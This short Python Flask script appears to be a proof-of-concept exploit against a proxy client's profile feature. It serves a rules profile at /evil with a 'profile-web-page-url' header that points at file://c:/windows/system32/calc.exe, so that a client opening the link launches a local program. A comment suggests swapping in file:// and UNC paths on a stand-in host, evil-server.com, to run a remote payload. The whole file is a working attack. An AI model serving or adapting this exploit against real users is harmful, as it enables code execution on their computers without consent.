# coding:utf-8
 
from flask import Flask, make_response
 
app = Flask(__name__)
 
@app.route("/evil")
def index():
    resp = make_response("""
rules:
  - DOMAIN-SUFFIX,evil,DIRECT
""")
    resp.headers["profile-web-page-url"] = """file://c:/windows/system32/calc.exe """
    # poc try file://net/evil-server.com/nfs/evil/payload.app \\evil-server.com\evil\payload.exe to execute remote payload
    return resp
 
if __name__ == '__main__':
    app.run(host = '0.0.0.0',
        port = 80,  
        debug = True)
